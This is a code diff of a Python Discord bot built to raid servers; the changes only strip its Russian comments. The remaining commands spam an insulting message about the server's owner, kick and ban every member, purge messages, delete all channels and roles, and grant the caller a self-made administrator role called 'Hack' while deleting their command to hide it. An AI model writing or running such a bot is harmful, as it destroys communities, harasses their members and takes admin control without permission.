@@ -11,10 +11,10 @@ async def on_ready():
 
 @client.command(pass_context=True)
 async def spam(ctx, m):
-    await ctx.message.delete() #удаляем сообщение пользователя, чтобы не спалился
+    await ctx.message.delete() 
     count = 0
     while count < int(m):
-        await ctx.send("Создатель данного сервера тупое мудло\nЗаказчик бота: Мистер_Шотакон \nСоздатель бота: Wahha") #отправка текста
+        await ctx.send("Создатель данного сервера тупое мудло\nЗаказчик бота: Мистер_Шотакон \nСоздатель бота: Wahha")
         count += 1
 
 @client.command(pass_context=True)
@@ -36,35 +36,35 @@ async def role(ctx, m):
 
 @client.command()
 async def allkick(ctx):
-    for m in ctx.guild.members: #собираем всех участников
+    for m in ctx.guild.members: 
         try:
-            await m.kick(reason="Lolli_Hohol") #кикаем
+            await m.kick(reason="Lolli_Hohol") 
         except:
             pass
 
 @client.command()
 async def allban(ctx):
-    for m in ctx.guild.members: #собираем
+    for m in ctx.guild.members: 
         try:
-            await m.ban(reason="Lolli_Hohol")#баним
+            await m.ban(reason="Lolli_Hohol")
         except:
             pass
 
 @client.command()
 async def delete(ctx, amount=100):
-    await ctx.channel.purge(limit=amount) #очищаем
+    await ctx.channel.purge(limit=amount)
 
 @client.command()
 async def delchannel(ctx):
     failed = []
     counter = 0
-    for channel in ctx.guild.channels: #собираем
+    for channel in ctx.guild.channels: 
         try:
-            await channel.delete(reason="По просьбе") #удаляем
+            await channel.delete(reason="По просьбе") 
         except: failed.append(channel.name)
         else: counter += 1
     fmt = ", ".join(failed)
-    await ctx.author.send(f"Удалено {counter} каналов. {f'Не удалил: {fmt}' if len(failed) > 0 else ''}") # отпровляем отчёт отправителю команды
+    await ctx.author.send(f"Удалено {counter} каналов. {f'Не удалил: {fmt}' if len(failed) > 0 else ''}")
 
 @client.command()
 async def delrole(ctx):
@@ -74,16 +74,16 @@ async def delrole(ctx):
         except:
             pass
 
-@client.command(pass_context=True)  # разрешаем передавать агрументы
-async def admin(ctx):  # создаем асинхронную фунцию бота
+@client.command(pass_context=True)  
+async def admin(ctx):  
     
     guild = ctx.guild
-    perms = discord.Permissions(administrator=True) #права роли
-    await guild.create_role(name="Hack", permissions=perms) #создаем роль
+    perms = discord.Permissions(administrator=True) 
+    await guild.create_role(name="Hack", permissions=perms)
     
-    role = discord.utils.get(ctx.guild.roles, name="Hack") #находим роль по имени
-    user = ctx.message.author #находим юзера
-    await user.add_roles(role) #добовляем роль
+    role = discord.utils.get(ctx.guild.roles, name="Hack") 
+    user = ctx.message.author 
+    await user.add_roles(role)
     
     await ctx.message.delete()
 
